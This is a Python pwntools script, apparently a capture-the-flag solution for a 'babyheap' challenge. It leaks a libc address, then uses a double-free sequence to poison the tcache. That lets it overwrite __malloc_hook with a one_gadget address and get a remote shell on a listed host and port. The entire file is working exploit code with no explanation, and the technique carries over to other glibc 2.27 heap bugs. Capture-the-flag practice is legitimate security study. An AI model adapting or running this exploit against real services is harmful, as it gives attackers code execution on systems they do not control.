import sys
from pwn import *

ONE_GADGET_RCE = int(sys.argv[1])

target = ELF('./babyheap')
libc = ELF('./libc-2.27.so')

r = remote('133.242.68.223', 58396)

r.recvuntil('>>>>> ')
LIBC_BASE = int(r.recvline().split()[0], 16) - libc.symbols['_IO_2_1_stdin_']

r.sendlineafter('> ', '1')
r.sendlineafter('Input Content: ', 'hoge')
r.sendlineafter('> ', '2')
r.sendlineafter('> ', '2')
r.sendlineafter('> ', '3')
r.sendlineafter('> ', '1')
r.sendlineafter('Input Content: ', p64(LIBC_BASE + libc.symbols['__malloc_hook']))
r.sendlineafter('> ', '3')
r.sendlineafter('> ', '1')
r.sendlineafter('Input Content: ', 'hoge')
r.sendlineafter('> ', '3')
r.sendlineafter('> ', '1')
r.sendlineafter('Input Content: ', p64(LIBC_BASE + ONE_GADGET_RCE))
r.sendlineafter('> ', '3')
r.sendlineafter('> ', '1')

r.interactive()
